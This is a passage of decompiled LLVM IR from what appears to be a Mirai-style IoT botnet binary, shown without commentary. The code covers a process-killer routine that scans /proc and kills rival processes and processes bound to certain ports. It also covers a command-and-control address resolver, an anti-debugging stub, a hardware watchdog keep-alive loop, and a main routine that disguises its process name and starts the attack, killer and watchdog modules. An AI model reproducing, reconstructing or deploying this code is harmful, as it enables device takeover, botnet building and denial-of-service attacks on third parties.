  %v0_d538 = phi i32 [ %v0_d538.pre, %dec_label_pc_d51c.dec_label_pc_d534_crit_edge ], [ %v0_d510, %dec_label_pc_d510 ], [ %v1_d504, %dec_label_pc_d4fc ]
  store i32 %v2_d3cc, i32* @r7, align 4
  store i32 %v0_d538, i32* @r5, align 4
  br label %dec_label_pc_d31c.backedge

dec_label_pc_d31c.backedge:                       ; preds = %dec_label_pc_d380, %dec_label_pc_d378, %dec_label_pc_d32c, %dec_label_pc_d534, %dec_label_pc_d694, %.thread10
  %stack_var_-8452.1.be = phi i32 [ %v1_d350, %dec_label_pc_d694 ], [ %v1_d350, %dec_label_pc_d534 ], [ %v1_d350, %.thread10 ], [ %stack_var_-8452.2, %dec_label_pc_d32c ], [ %v1_d350, %dec_label_pc_d378 ], [ %v1_d350, %dec_label_pc_d380 ]
  %v0_d31c = load i32, i32* @fp, align 4
  %v1_d320 = inttoptr i32 %v0_d31c to i32*
  %v2_d320 = call i32 @__GI_readdir(i32* %v1_d320)
  %v2_d324 = icmp eq i32 %v2_d320, 0
  br i1 %v2_d324, label %dec_label_pc_d3bc, label %dec_label_pc_d32c.preheader

dec_label_pc_d540:                                ; preds = %dec_label_pc_d51c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d548 = call i32 @__libc_open(i32 %v1_cfb8, i32 0)
  %v7_d54c = icmp eq i32 %v2_d548, -1
  store i32 %v2_d548, i32* @r4, align 4
  br i1 %v7_d54c, label %bb137, label %.thread12

bb137:                                            ; preds = %dec_label_pc_d540
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d540, %bb137
  store i32 ptrtoint (i32* @global_var_d560.82 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d54c, i32 ptrtoint (i32* @global_var_12298.81 to i32))
  %v0_d560 = load i32, i32* @r4, align 4
  %v1_d564 = call i32 @__GI___libc_close(i32 %v0_d560)
  br label %dec_label_pc_d568

dec_label_pc_d568:                                ; preds = %dec_label_pc_d3c8, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d570 = call i32 @__libc_open(i32 %v2_d3f4, i32 0)
  %v7_d574 = icmp eq i32 %v2_d570, -1
  store i32 %v2_d570, i32* @sl, align 4
  br i1 %v7_d574, label %dec_label_pc_d694, label %dec_label_pc_d580

dec_label_pc_d580:                                ; preds = %dec_label_pc_d568
  %v1_d584 = call i32 @table_unlock_val(i32 18)
  %v1_d58c = call i32 @table_unlock_val(i32 19)
  store i32 %v2_d594, i32* %r1.global-to-local, align 4
  %v3_d59c = call i32 @table_retrieve_val(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v3_d59c, i32* @r6, align 4
  store i32 %v2_d5a8, i32* %r1.global-to-local, align 4
  %v3_d5b0 = call i32 @table_retrieve_val(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d5b0, i32* @r7, align 4
  store i32 %v2_d5bc, i32* @r4, align 4
  %v0_d5c056 = load i32, i32* @sl, align 4
  store i32 %v2_d5bc, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d5cc57 = call i32 @__libc_read(i32 %v0_d5c056)
  %tmp138 = icmp slt i32 %v1_d5cc57, 1
  br i1 %tmp138, label %dec_label_pc_d708, label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d580, %dec_label_pc_d5c0.backedge
  %v0_d60c47 = phi i32 [ %v1_d5cc, %dec_label_pc_d5c0.backedge ], [ %v1_d5cc57, %dec_label_pc_d580 ]
  store i32 %v2_d204, i32* @r3, align 4
  %v3_d5dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d5dc, i32* @r5, align 4
  %v5_d5e4 = icmp slt i32 %v0_d60c47, %v3_d5dc
  br i1 %v5_d5e4, label %dec_label_pc_d5f4, label %dec_label_pc_d648.lr.ph

dec_label_pc_d648.lr.ph:                          ; preds = %dec_label_pc_d5d8
  %v1_d64039 = add i32 %v0_d60c47, -1
  store i32 %v1_d64039, i32* %r1.global-to-local, align 4
  %v0_d648.pre = load i32, i32* @r6, align 4
  %v1_d64c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d648

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d640.backedge, %dec_label_pc_d5d8
  store i32 %v2_d204, i32* %r1.global-to-local, align 4
  %v3_d5f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d5f8, i32* @lr, align 4
  %v5_d600 = icmp slt i32 %v0_d60c47, %v3_d5f8
  br i1 %v5_d600, label %dec_label_pc_d5c0.backedge, label %.thread25

dec_label_pc_d5c0.backedge:                       ; preds = %dec_label_pc_d628, %.thread25, %dec_label_pc_d5f4
  %v0_d5c0 = load i32, i32* @sl, align 4
  store i32 %v2_d5bc, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d5cc = call i32 @__libc_read(i32 %v0_d5c0)
  %tmp139 = icmp slt i32 %v1_d5cc, 1
  br i1 %tmp139, label %dec_label_pc_d708, label %dec_label_pc_d5d8

.thread25:                                        ; preds = %dec_label_pc_d5f4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d60c49 = icmp eq i32 %v0_d60c47, 0
  br i1 %v2_d60c49, label %dec_label_pc_d5c0.backedge, label %dec_label_pc_d614.lr.ph

dec_label_pc_d614.lr.ph:                          ; preds = %.thread25
  %v0_d614.pre = load i32, i32* @r7, align 4
  %v1_d618.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d614

dec_label_pc_d614:                                ; preds = %dec_label_pc_d628, %dec_label_pc_d614.lr.ph
  %v0_d60c.in = phi i32 [ %v0_d60c47, %dec_label_pc_d614.lr.ph ], [ %v0_d60c, %dec_label_pc_d628 ]
  %v0_d628 = phi i32 [ 0, %dec_label_pc_d614.lr.ph ], [ %v1_d628, %dec_label_pc_d628 ]
  %v1_d614 = phi i32 [ 0, %dec_label_pc_d614.lr.ph ], [ %v1_d61486, %dec_label_pc_d628 ]
  %v0_d60c = add i32 %v0_d60c.in, -1
  %v2_d614 = add i32 %v1_d614, %v0_d614.pre
  %v3_d614 = inttoptr i32 %v2_d614 to i8*
  %v4_d614 = load i8, i8* %v3_d614, align 1
  %v6_d614 = zext i8 %v4_d614 to i32
  store i32 %v6_d614, i32* %r2.global-to-local, align 4
  %v2_d618 = add i32 %v0_d628, %v1_d618.pre
  %v3_d618 = inttoptr i32 %v2_d618 to i8*
  %v4_d618 = load i8, i8* %v3_d618, align 1
  %v6_d618 = zext i8 %v4_d618 to i32
  store i32 %v6_d618, i32* @r3, align 4
  %v9_d61c = icmp eq i8 %v4_d618, %v4_d614
  br i1 %v9_d61c, label %dec_label_pc_d664, label %bb140

bb140:                                            ; preds = %dec_label_pc_d614
  br label %dec_label_pc_d628

dec_label_pc_d628:                                ; preds = %bb140, %dec_label_pc_d664
  %v1_d61486 = phi i32 [ %v1_d664, %dec_label_pc_d664 ], [ 0, %bb140 ]
  %v1_d628 = add i32 %v0_d628, 1
  store i32 %v1_d628, i32* %r1.global-to-local, align 4
  %v2_d60c = icmp eq i32 %v0_d60c, 0
  br i1 %v2_d60c, label %dec_label_pc_d5c0.backedge, label %dec_label_pc_d614

dec_label_pc_d630:                                ; preds = %dec_label_pc_d648
  %v1_d630 = add i32 %v1_d648, 1
  store i32 %v1_d630, i32* @lr, align 4
  %v9_d634 = icmp eq i32 %v3_d5dc, %v1_d630
  br i1 %v9_d634, label %dec_label_pc_d670, label %dec_label_pc_d640.backedge

dec_label_pc_d640.backedge:                       ; preds = %dec_label_pc_d630, %dec_label_pc_d65c
  %v1_d64877 = phi i32 [ 0, %dec_label_pc_d65c ], [ %v1_d630, %dec_label_pc_d630 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d640 = add i32 %v0_d640, -1
  store i32 %v1_d640, i32* %r1.global-to-local, align 4
  %v2_d640 = icmp eq i32 %v0_d640, 0
  br i1 %v2_d640, label %dec_label_pc_d5f4, label %dec_label_pc_d648

dec_label_pc_d648:                                ; preds = %dec_label_pc_d640.backedge, %dec_label_pc_d648.lr.ph
  %v0_d640 = phi i32 [ %v1_d64039, %dec_label_pc_d648.lr.ph ], [ %v1_d640, %dec_label_pc_d640.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d648.lr.ph ], [ %storemerge, %dec_label_pc_d640.backedge ]
  %v1_d648 = phi i32 [ 0, %dec_label_pc_d648.lr.ph ], [ %v1_d64877, %dec_label_pc_d640.backedge ]
  %v2_d648 = add i32 %v1_d648, %v0_d648.pre
  %v3_d648 = inttoptr i32 %v2_d648 to i8*
  %v4_d648 = load i8, i8* %v3_d648, align 1
  %v6_d648 = zext i8 %v4_d648 to i32
  store i32 %v6_d648, i32* %r2.global-to-local, align 4
  %v2_d64c = add i32 %storemerge.in, %v1_d64c.pre
  %v3_d64c = inttoptr i32 %v2_d64c to i8*
  %v4_d64c = load i8, i8* %v3_d64c, align 1
  %v6_d64c = zext i8 %v4_d64c to i32
  store i32 %v6_d64c, i32* @r3, align 4
  %v9_d650 = icmp eq i8 %v4_d64c, %v4_d648
  br i1 %v9_d650, label %dec_label_pc_d630, label %dec_label_pc_d65c

dec_label_pc_d65c:                                ; preds = %dec_label_pc_d648
  br label %dec_label_pc_d640.backedge

dec_label_pc_d664:                                ; preds = %dec_label_pc_d614
  %v1_d664 = add i32 %v1_d614, 1
  %v9_d668 = icmp eq i32 %v3_d5f8, %v1_d664
  br i1 %v9_d668, label %dec_label_pc_d670, label %dec_label_pc_d628

dec_label_pc_d670:                                ; preds = %dec_label_pc_d630, %dec_label_pc_d664
  %v1_d674 = call i32 @table_lock_val(i32 18)
  %v1_d67c = call i32 @table_lock_val(i32 19)
  %v0_d680 = load i32, i32* @sl, align 4
  %v1_d684 = call i32 @__GI___libc_close(i32 %v0_d680)
  %v0_d688 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d690 = call i32 @kill(i32 %v0_d688, i32 9)
  br label %dec_label_pc_d694

dec_label_pc_d694:                                ; preds = %dec_label_pc_d568, %dec_label_pc_d708, %dec_label_pc_d670
  store i32 %v2_d3f4, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d69c = call i32 @util_zero()
  store i32 %v2_d444, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d6ac = call i32 @util_zero()
  %v1_d6b4 = call i32 @sleep(i32 1)
  store i32 %v2_d3cc, i32* @r7, align 4
  %v0_d6bc = load i32, i32* @r8, align 4
  store i32 %v0_d6bc, i32* @r5, align 4
  br label %dec_label_pc_d31c.backedge

dec_label_pc_d6c4:                                ; preds = %dec_label_pc_d0a0
  %v1_d6cc = call i32 @killer_kill_by_port(i32 42448)
  %v2_d6d0 = icmp eq i32 %v1_d6cc, 0
  br i1 %v2_d6d0, label %dec_label_pc_d6d8, label %dec_label_pc_d240

dec_label_pc_d6d8:                                ; preds = %dec_label_pc_d6c4
  %v1_d6dc = call i32 @killer_kill_by_port(i32 20480)
  %v2_d6e0 = icmp eq i32 %v1_d6dc, 0
  br i1 %v2_d6e0, label %dec_label_pc_d6e8, label %dec_label_pc_d240

dec_label_pc_d6e8:                                ; preds = %dec_label_pc_d6d8
  %v1_d6f0 = call i32 @killer_kill_by_port(i32 34254)
  %v2_d6f4 = icmp eq i32 %v1_d6f0, 0
  br i1 %v2_d6f4, label %dec_label_pc_d6fc, label %dec_label_pc_d240

dec_label_pc_d6fc:                                ; preds = %dec_label_pc_d6e8
  %v0_d6fc = load i32, i32* @r4, align 4
  %v1_d700 = call i32 @killer_kill_by_port(i32 %v0_d6fc)
  br label %dec_label_pc_d240

dec_label_pc_d708:                                ; preds = %dec_label_pc_d5c0.backedge, %dec_label_pc_d580
  %v1_d70c = call i32 @table_lock_val(i32 18)
  %v1_d714 = call i32 @table_lock_val(i32 19)
  %v0_d718 = load i32, i32* @sl, align 4
  %v1_d71c = call i32 @__GI___libc_close(i32 %v0_d718)
  br label %dec_label_pc_d694

; uselistorder directives
  uselistorder i32 %v1_d664, { 1, 0 }
  uselistorder i32 %v1_d628, { 1, 0 }
  uselistorder i32 %v1_d614, { 1, 0 }
  uselistorder i32 %v0_d628, { 1, 0 }
  uselistorder i32 %v1_d5cc, { 1, 0 }
  uselistorder i32 %v2_d570, { 1, 0 }
  uselistorder i1 %v7_d54c, { 1, 0 }
  uselistorder i32 %v2_d548, { 1, 0 }
  uselistorder i32 %v2_d320, { 1, 0 }
  uselistorder i32 %stack_var_-8452.1.be, { 1, 0 }
  uselistorder i32 %v3_d4a0, { 1, 2, 0 }
  uselistorder i32 %v2_d3b0, { 1, 0 }
  uselistorder i32 %v1_d350, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d32c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_d2f0, { 1, 2, 0 }
  uselistorder i32 %v3_d2b8, { 1, 2, 0 }
  uselistorder i32 %v3_d284, { 1, 2, 0 }
  uselistorder i32 %v3_d24c, { 1, 2, 0 }
  uselistorder i32 %stack_var_-8452.0, { 1, 0 }
  uselistorder i32 %v2_d5bc, { 1, 0, 2 }
  uselistorder i32 %v2_d5a0, { 1, 0 }
  uselistorder i32 %v2_d444, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d050, { 1, 0 }
  uselistorder i32 %v2_d01c, { 2, 0, 1 }
  uselistorder i32 %v3_cfc8, { 1, 0 }
  uselistorder i32 %v1_cfb8, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13, 14 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cf28, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 3, 0, 5, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32, i32)* @listen, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_25d4c.75, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d694, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d670, { 1, 0 }
  uselistorder label %dec_label_pc_d640.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d628, { 1, 0 }
  uselistorder label %dec_label_pc_d5d8, { 1, 0 }
  uselistorder label %dec_label_pc_d568, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d31c.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d4fc, { 1, 0 }
  uselistorder label %dec_label_pc_d32c, { 1, 0 }
  uselistorder label %dec_label_pc_d32c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d2e4, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d240, { 4, 0, 1, 2, 3 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d74c.84 to i32), i32* @global_var_230c0.86, align 4
  ret i32 %arg1
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_d754 = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_1a7fc.88 to i32), i32* @r0, align 4
  %v2_d75c = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1a7fc.88 to i32))
  store i32 ptrtoint (i16** @global_var_25d54.90 to i32), i32* @r4, align 4
  store i32 %v2_d75c, i32* @global_var_25d58.91, align 4
  %v3_d770 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d770 = inttoptr i32 %v3_d770 to i16*
  %v3_d774 = load i16, i16* %v4_d770, align 2
  store i16 %v3_d774, i16* bitcast (i32* @global_var_25d56.92 to i16*), align 4
  %v1_d780 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_d780
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d794 = load i32, i32* @r4, align 4
  %v6_d794 = load i32, i32* @r5, align 4
  %v9_d794 = load i32, i32* @lr, align 4
  %v0_d79c = call i32 @__libc_fork()
  %v7_d7a0 = icmp eq i32 %v0_d79c, -1
  %. = zext i1 %v7_d7a0 to i32
  %tmp11 = icmp slt i32 %v0_d79c, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d7bc = icmp eq i32 %storemerge4, 0
  store i32 %v0_d79c, i32* @global_var_23234.94, align 4
  br i1 %v2_d7bc, label %dec_label_pc_d7d4, label %dec_label_pc_d7c8

dec_label_pc_d7c8:                                ; preds = %entry
  store i32 %v3_d794, i32* @r4, align 4
  store i32 %v6_d794, i32* @r5, align 4
  store i32 %v9_d794, i32* @lr, align 4
  ret i32 %v0_d79c

dec_label_pc_d7d4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d7e0 = call i32 @table_unlock_val(i32 23)
  %v1_d7e8 = call i32 @table_unlock_val(i32 24)
  %v0_d7ec = load i32, i32* @r5, align 4
  %v2_d7f4 = inttoptr i32 %v0_d7ec to i32*
  %v3_d7f4 = call i32 @table_retrieve_val(i32 23, i32* %v2_d7f4)
  %v2_d7fc = call i32 @__libc_open(i32 %v3_d7f4, i32 2)
  %v7_d800 = icmp eq i32 %v2_d7fc, -1
  store i32 %v2_d7fc, i32* @r4, align 4
  br i1 %v7_d800, label %dec_label_pc_d848, label %dec_label_pc_d80c

dec_label_pc_d80c:                                ; preds = %dec_label_pc_d848, %dec_label_pc_d7d4
  %v0_d818 = phi i32 [ %v2_d858, %dec_label_pc_d848 ], [ %v2_d7fc, %dec_label_pc_d7d4 ]
  %v2_d81c = ptrtoint i32* %stack_var_-20 to i32
  %v3_d820 = call i32 @ioctl(i32 %v0_d818, i32 -2147199228, i32 %v2_d81c)
  br label %dec_label_pc_d824

dec_label_pc_d824:                                ; preds = %dec_label_pc_d824, %dec_label_pc_d80c
  %v0_d830 = load i32, i32* @r4, align 4
  %v3_d838 = call i32 @ioctl(i32 %v0_d830, i32 -2147199227, i32 0)
  %v1_d840 = call i32 @sleep(i32 10)
  br label %dec_label_pc_d824

dec_label_pc_d848:                                ; preds = %dec_label_pc_d7d4
  %v0_d848 = load i32, i32* @r5, align 4
  %v2_d850 = inttoptr i32 %v0_d848 to i32*
  %v3_d850 = call i32 @table_retrieve_val(i32 24, i32* %v2_d850)
  %v2_d858 = call i32 @__libc_open(i32 %v3_d850, i32 2)
  %v3_d85c = icmp eq i32 %v2_d858, -1
  store i32 %v2_d858, i32* @r4, align 4
  br i1 %v3_d85c, label %dec_label_pc_d868, label %dec_label_pc_d80c

dec_label_pc_d868:                                ; preds = %dec_label_pc_d848
  %v1_d86c = call i32 @table_lock_val(i32 23)
  %v1_d874 = call i32 @table_lock_val(i32 24)
  %v0_d878 = load i32, i32* @r5, align 4
  %v1_d87c = call i32 @__GI_exit(i32 %v0_d878)
  %v0_d880 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d880, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d868
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d868, %bb14
  ret i32 %v1_d87c

; uselistorder directives
  uselistorder i32 %v2_d858, { 1, 2, 0 }
  uselistorder i32 %v2_d7fc, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d79c, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_d890 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d890, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d8a8 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_d8b4 = call i32 @__GI_sigaddset(i32 %v2_d890, i32 2)
  %v0_d8b8 = load i32, i32* @r5, align 4
  store i32 %v0_d8b8, i32* %r2.global-to-local, align 4
  %v4_d8c4 = call i32 @__GI_sigprocmask(i32 %v0_d8b8, i32* nonnull %stack_var_-64, i32 %v0_d8b8)
  %v2_d8d0 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d8dc = call i32 @bsd_signal(i32 5, i32 55092)
  %v0_d8e0 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_25d54.90 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_25d58.91, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d8e0, i32* @global_var_25d48.57, align 4
  store i16 5888, i16* bitcast (i32* @global_var_25d56.92 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_25d54.90 to i16*), align 4
  %v6_d908 = call i32 @table_init(i32 %v0_d8e0, i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32 ptrtoint (i16** @global_var_25d54.90 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d74c.84 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_230c0.86 to i32), i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d74c.84 to i32), i32* @global_var_230c0.86, align 4
  %v1_d918 = call i32 @rand_init(i32 %v6_d908)
  %v2_d920 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_d920, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d928 = call i32 @util_zero()
  %v0_d92c = load i32, i32* @r6, align 4
  %v7_d92c = icmp eq i32 %v0_d92c, 2
  br i1 %v7_d92c, label %dec_label_pc_da64, label %dec_label_pc_d934

dec_label_pc_d934:                                ; preds = %dec_label_pc_da64, %entry, %dec_label_pc_da74
  %v0_d934 = call i32 @rand_next()
  store i32 %v0_d934, i32* @r6, align 4
  %v0_d93c = load i32, i32* @r8, align 4
  %v1_d93c = inttoptr i32 %v0_d93c to i32*
  %v2_d93c = load i32, i32* %v1_d93c, align 4
  %v1_d940 = inttoptr i32 %v2_d93c to i8*
  %v2_d940 = call i32 @util_strlen(i8* %v1_d940)
  %v0_d948 = load i32, i32* @r8, align 4
  %v1_d948 = inttoptr i32 %v0_d948 to i32*
  %v2_d948 = load i32, i32* %v1_d948, align 4
  %v1_d94c = inttoptr i32 %v2_d948 to i8*
  %v2_d94c = call i32 @util_strlen(i8* %v1_d94c)
  %v1_d950 = sub i32 20, %v2_d940
  %v0_d958 = load i32, i32* @r6, align 4
  %v3_d95c = urem i32 %v0_d958, %v1_d950
  %v2_d964 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_d964, i32* @r5, align 4
  %v2_d968 = add i32 %v3_d95c, %v2_d94c
  store i32 %v2_d968, i32* @r4, align 4
  %v2_d974 = call i32 @rand_alpha_str(i32 %v2_d964, i32 %v2_d968)
  %v2_d97c = ptrtoint i32* %stack_var_-40 to i32
  %v1_d980 = load i32, i32* @r4, align 4
  %v2_d980 = add i32 %v1_d980, %v2_d97c
  store i32 %v2_d980, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_d98c = load i32, i32* @r8, align 4
  %v1_d98c = inttoptr i32 %v0_d98c to i32*
  %v2_d98c = load i32, i32* %v1_d98c, align 4
  store i32 %v2_d98c, i32* @r0, align 4
  %v3_d990 = add i32 %v2_d980, -64
  %v4_d990 = inttoptr i32 %v3_d990 to i8*
  store i8 0, i8* %v4_d990, align 1
  %v2_d994 = inttoptr i32 %v2_d98c to i8*
  %v3_d994 = call i32 @util_strcpy(i8* %v2_d994, i32 %v2_d964)
  store i32 32, i32* @r1, align 4
  store i32 %v2_d964, i32* @r0, align 4
  %v0_d9a0 = call i32 @util_zero()
  %v0_d9a4 = call i32 @rand_next()
  store i32 %v0_d9a4, i32* @r7, align 4
  %v0_d9ac = load i32, i32* @r8, align 4
  %v1_d9ac = inttoptr i32 %v0_d9ac to i32*
  %v2_d9ac = load i32, i32* %v1_d9ac, align 4
  %v1_d9b0 = inttoptr i32 %v2_d9ac to i8*
  %v2_d9b0 = call i32 @util_strlen(i8* %v1_d9b0)
  store i32 %v2_d9b0, i32* @r6, align 4
  %v0_d9b8 = load i32, i32* @r8, align 4
  %v1_d9b8 = inttoptr i32 %v0_d9b8 to i32*
  %v2_d9b8 = load i32, i32* %v1_d9b8, align 4
  %v1_d9bc = inttoptr i32 %v2_d9b8 to i8*
  %v2_d9bc = call i32 @util_strlen(i8* %v1_d9bc)
  %v0_d9c0 = load i32, i32* @r6, align 4
  %v1_d9c0 = sub i32 20, %v0_d9c0
  %v0_d9c8 = load i32, i32* @r7, align 4
  %v3_d9cc = urem i32 %v0_d9c8, %v1_d9c0
  %v2_d9d0 = add i32 %v3_d9cc, %v2_d9bc
  store i32 %v2_d9d0, i32* @r4, align 4
  %v2_d9dc = call i32 @rand_alpha_str(i32 %v2_d964, i32 %v2_d9d0)
  store i32 %v2_d97c, i32* %r2.global-to-local, align 4
  %v1_d9e8 = load i32, i32* @r4, align 4
  %v2_d9e8 = add i32 %v1_d9e8, %v2_d97c
  store i32 %v2_d9e8, i32* %r3.global-to-local, align 4
  %v0_d9ec = load i32, i32* @sb, align 4
  %v1_d9ec = trunc i32 %v0_d9ec to i8
  %v3_d9ec = add i32 %v2_d9e8, -64
  %v4_d9ec = inttoptr i32 %v3_d9ec to i8*
  store i8 %v1_d9ec, i8* %v4_d9ec, align 1
  %v4_d9f8 = call i32 @prctl(i32 15, i32 %v2_d964, i32 %v2_d97c, i32 %v2_d9e8)
  %v1_da00 = call i32 @table_unlock_val(i32 3)
  %v3_da0c = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_da10 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_da10, i32* @r2, align 4
  %v2_da1c = call i32 @__GI___libc_write(i32 1, i32 %v3_da0c)
  store i32 1, i32* @r2, align 4
  %v2_da2c = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_1a80c.102 to i32))
  %v1_da34 = call i32 @table_lock_val(i32 3)
  %v1_da38 = call i32 @attack_init(i32 %v1_da34)
  %v1_da3c = call i32 @killer_init(i32 %v1_da38)
  %v1_da40 = call i32 @watchdog_maintain(i32 %v1_da3c)
  %v0_da44 = call i32 @__libc_fork()
  %v1_da48 = load i32, i32* @sb, align 4
  %v7_da4c = icmp sgt i32 %v0_da44, %v1_da48
  br i1 %v7_da4c, label %dec_label_pc_da50, label %dec_label_pc_daa0

dec_label_pc_da50:                                ; preds = %dec_label_pc_d934
  ret i32 %v1_da48

dec_label_pc_da64:                                ; preds = %entry
  %v0_da64 = load i32, i32* @r8, align 4
  %v1_da64 = add i32 %v0_da64, 4
  %v2_da64 = inttoptr i32 %v1_da64 to i32*
  %v3_da64 = load i32, i32* %v2_da64, align 4
  %v1_da68 = inttoptr i32 %v3_da64 to i8*
  %v2_da68 = call i32 @util_strlen(i8* %v1_da68)
  %v8_da70 = icmp sgt i32 %v2_da68, 31
  br i1 %v8_da70, label %dec_label_pc_d934, label %dec_label_pc_da74

dec_label_pc_da74:                                ; preds = %dec_label_pc_da64
  %v0_da78 = load i32, i32* @r8, align 4
  %v1_da78 = add i32 %v0_da78, 4
  %v2_da78 = inttoptr i32 %v1_da78 to i32*
  %v3_da78 = load i32, i32* %v2_da78, align 4
  store i32 %v2_d920, i32* @r0, align 4
  %v2_da80 = bitcast i32* %stack_var_-136 to i8*
  %v3_da80 = call i32 @util_strcpy(i8* %v2_da80, i32 %v3_da78)
  %v0_da84 = load i32, i32* @r8, align 4
